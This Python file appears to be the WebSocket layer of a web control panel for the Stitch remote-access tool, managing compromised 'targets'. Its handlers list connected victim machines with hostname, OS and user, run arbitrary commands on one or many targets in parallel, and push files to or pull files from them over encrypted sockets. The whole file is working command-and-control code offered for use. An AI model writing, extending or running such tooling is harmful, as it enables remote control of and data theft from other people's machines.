#!/usr/bin/env python3
"""
Strategic Command Center - WebSocket Extensions
Real-time communication for the strategic interface
"""

import json
import time
import asyncio
import threading
from typing import Dict, Any, List, Optional
from flask_socketio import emit, join_room, leave_room
from flask import session

from strategic_command_center import get_strategic_center, StrategicCommandCenter

def register_strategic_websocket_events(socketio, logger):
    """Register strategic WebSocket events"""
    
    strategic_center = get_strategic_center()
    
    @socketio.on('connect')
    def handle_connect():
        """Handle client connection"""
        logger.info(f"Strategic client connected: {session.get('user_id', 'anonymous')}")
        emit('strategic_connected', {
            'status': 'connected',
            'timestamp': time.time(),
            'message': 'Strategic Command Center connected'
        })
    
    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle client disconnect"""
        logger.info(f"Strategic client disconnected: {session.get('user_id', 'anonymous')}")
    
    @socketio.on('get_targets')
    def handle_get_targets():
        """Get all targets with real-time status from Stitch system"""
        try:
            from web_app_real import get_stitch_server
            import configparser
            
            server = get_stitch_server()
            targets = []
            
            # Get real targets from Stitch system
            if server.inf_sock:
                config = configparser.ConfigParser()
                config.read('/workspace/Application/Stitch_Vars/hist_ini')
                
                for target_id in server.inf_sock.keys():
                    target_info = {
                        'id': target_id,
                        'ip': target_id,
                        'hostname': target_id,
                        'os': 'Unknown',
                        'status': 'online',
                        'last_seen': time.time(),
                        'cpu_percent': 0.0,
                        'memory_percent': 0.0,
                        'network_speed': 0.0,
                        'health_score': 100,
                        'connection_type': 'tcp',
                        'capabilities': []
                    }
                    
                    # Get real target info from config
                    if target_id in config.sections():
                        target_info['hostname'] = config.get(target_id, 'hostname', fallback=target_id)
                        target_info['os'] = config.get(target_id, 'os', fallback='Unknown')
                        target_info['user'] = config.get(target_id, 'user', fallback='Unknown')
                    
                    targets.append(target_info)
            
            emit('targets_update', {
                'targets': targets,
                'count': len(targets),
                'timestamp': time.time()
            })
        except Exception as e:
            logger.error(f"Get targets error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('get_target')
    def handle_get_target(data):
        """Get specific target information"""
        try:
            target_id = data.get('target_id')
            if not target_id:
                emit('error', {'error': 'Missing target_id'})
                return
            
            target = strategic_center.get_target(target_id)
            if target:
                emit('target_detail', {
                    'target': target,
                    'timestamp': time.time()
                })
            else:
                emit('error', {'error': f'Target {target_id} not found'})
        except Exception as e:
            logger.error(f"Get target error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('execute_command')
    def handle_execute_command(data):
        """Execute command on target using real Stitch system"""
        try:
            target_id = data.get('target_id')
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not target_id or not command:
                emit('error', {'error': 'Missing target_id or command'})
                return
            
            # Execute command using real Stitch system
            from web_app_real import execute_real_command
            result = execute_real_command(command, target_id, parameters)
            
            # Check if result indicates success or failure
            success = not result.startswith('❌') and not result.startswith('⚠️')
            
            # Emit result immediately
            emit('command_result', {
                'target_id': target_id,
                'command': command,
                'success': success,
                'output': result,
                'error': '' if success else result,
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"Execute command error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('execute_parallel_commands')
    def handle_execute_parallel_commands(data):
        """Execute command on multiple targets in parallel"""
        try:
            targets = data.get('targets', [])
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not targets or not command:
                emit('error', {'error': 'Missing targets or command'})
                return
            
            # Execute parallel commands
            command_ids = strategic_center.execute_parallel_commands(targets, command, parameters)
            
            emit('parallel_commands_queued', {
                'command_ids': command_ids,
                'targets': targets,
                'command': command,
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"Execute parallel commands error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('upload_file')
    def handle_upload_file(data):
        """Upload file to target using real Stitch system"""
        try:
            target_id = data.get('target_id')
            filename = data.get('filename')
            content = data.get('content')  # Base64 encoded
            path = data.get('path', '/tmp/')
            
            if not all([target_id, filename, content]):
                emit('error', {'error': 'Missing parameters'})
                return
            
            # Decode content
            import base64
            file_data = base64.b64decode(content)
            
            # Upload file using real Stitch system
            from web_app_real import stitch_lib
            from web_app_real import get_connection_aes_key
            from web_app_real import get_stitch_server
            
            server = get_stitch_server()
            if target_id not in server.inf_sock:
                emit('file_upload_error', {
                    'target_id': target_id,
                    'filename': filename,
                    'error': 'Target not connected',
                    'timestamp': time.time()
                })
                return
            
            # Get AES key for this connection
            aes_key = get_connection_aes_key(target_id)
            if not aes_key:
                emit('file_upload_error', {
                    'target_id': target_id,
                    'filename': filename,
                    'error': 'No encryption key available',
                    'timestamp': time.time()
                })
                return
            
            # Upload file using Stitch system
            result = stitch_lib.upload_file(
                server.inf_sock[target_id],
                file_data,
                filename,
                path,
                aes_key
            )
            
            if result:
                emit('file_upload_success', {
                    'target_id': target_id,
                    'filename': filename,
                    'path': path,
                    'message': 'File uploaded successfully',
                    'timestamp': time.time()
                })
            else:
                emit('file_upload_error', {
                    'target_id': target_id,
                    'filename': filename,
                    'error': 'Upload failed',
                    'timestamp': time.time()
                })
            
        except Exception as e:
            logger.error(f"Upload file error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('download_file')
    def handle_download_file(data):
        """Download file from target using real Stitch system"""
        try:
            target_id = data.get('target_id')
            path = data.get('path')
            
            if not target_id or not path:
                emit('error', {'error': 'Missing parameters'})
                return
            
            # Download file using real Stitch system
            from web_app_real import stitch_lib
            from web_app_real import get_connection_aes_key
            from web_app_real import get_stitch_server
            
            server = get_stitch_server()
            if target_id not in server.inf_sock:
                emit('file_download_error', {
                    'target_id': target_id,
                    'path': path,
                    'error': 'Target not connected',
                    'timestamp': time.time()
                })
                return
            
            # Get AES key for this connection
            aes_key = get_connection_aes_key(target_id)
            if not aes_key:
                emit('file_download_error', {
                    'target_id': target_id,
                    'path': path,
                    'error': 'No encryption key available',
                    'timestamp': time.time()
                })
                return
            
            # Download file using Stitch system
            file_content = stitch_lib.download_file(
                server.inf_sock[target_id],
                path,
                aes_key
            )
            
            if file_content:
                # Encode file content as base64 for transmission
                import base64
                encoded_content = base64.b64encode(file_content).decode('utf-8')
                
                emit('file_download_success', {
                    'target_id': target_id,
                    'path': path,
                    'filename': path.split('/')[-1],
                    'content': encoded_content,
                    'size': len(file_content),
                    'timestamp': time.time()
                })
            else:
                emit('file_download_error', {
                    'target_id': target_id,
                    'path': path,
                    'error': 'Download failed',
                    'timestamp': time.time()
                })
            
        except Exception as e:
            logger.error(f"Download file error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('get_command_results')
    def handle_get_command_results(data):
        """Get command results"""
        try:
            limit = data.get('limit', 100)
            results = strategic_center.get_command_results(limit)
            
            emit('command_results', {
                'results': results,
                'count': len(results),
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"Get command results error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('get_file_operations')
    def handle_get_file_operations(data):
        """Get file operations"""
        try:
            limit = data.get('limit', 100)
            operations = strategic_center.get_file_operations(limit)
            
            emit('file_operations', {
                'operations': operations,
                'count': len(operations),
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"Get file operations error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('get_system_stats')
    def handle_get_system_stats():
        """Get system statistics"""
        try:
            stats = strategic_center.get_system_stats()
            emit('system_stats', {
                'stats': stats,
                'timestamp': time.time()
            })
        except Exception as e:
            logger.error(f"Get system stats error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('join_target_room')
    def handle_join_target_room(data):
        """Join room for specific target updates"""
        try:
            target_id = data.get('target_id')
            if target_id:
                join_room(f"target_{target_id}")
                emit('joined_target_room', {
                    'target_id': target_id,
                    'timestamp': time.time()
                })
        except Exception as e:
            logger.error(f"Join target room error: {e}")
            emit('error', {'error': str(e)})
    
    @socketio.on('leave_target_room')
    def handle_leave_target_room(data):
        """Leave room for specific target updates"""
        try:
            target_id = data.get('target_id')
            if target_id:
                leave_room(f"target_{target_id}")
                emit('left_target_room', {
                    'target_id': target_id,
                    'timestamp': time.time()
                })
        except Exception as e:
            logger.error(f"Leave target room error: {e}")
            emit('error', {'error': str(e)})
    
    # Start real-time update broadcasting
    start_real_time_broadcasting(socketio, strategic_center, logger)
    
    logger.info("🎯 Strategic WebSocket events registered")

def start_real_time_broadcasting(socketio, strategic_center: StrategicCommandCenter, logger):
    """Start real-time broadcasting of updates"""
    
    def broadcast_updates():
        """Broadcast real-time updates to connected clients"""
        while True:
            try:
                # Check for target updates
                target_update = strategic_center.redis_client.get("strategic_ws_update")
                if target_update:
                    data = json.loads(target_update)
                    socketio.emit('targets_update', data)
                    strategic_center.redis_client.delete("strategic_ws_update")
                
                # Check for command updates
                command_update = strategic_center.redis_client.get("strategic_ws_command_update")
                if command_update:
                    data = json.loads(command_update)
                    socketio.emit('command_result', data)
                    strategic_center.redis_client.delete("strategic_ws_command_update")
                
                # Check for file updates
                file_update = strategic_center.redis_client.get("strategic_ws_file_update")
                if file_update:
                    data = json.loads(file_update)
                    socketio.emit('file_operation', data)
                    strategic_center.redis_client.delete("strategic_ws_file_update")
                
                time.sleep(0.5)  # Check every 500ms
                
            except Exception as e:
                logger.error(f"Broadcasting error: {e}")
                time.sleep(5)
    
    # Start broadcasting thread
    broadcast_thread = threading.Thread(target=broadcast_updates, daemon=True)
    broadcast_thread.start()
    logger.info("📡 Real-time broadcasting started")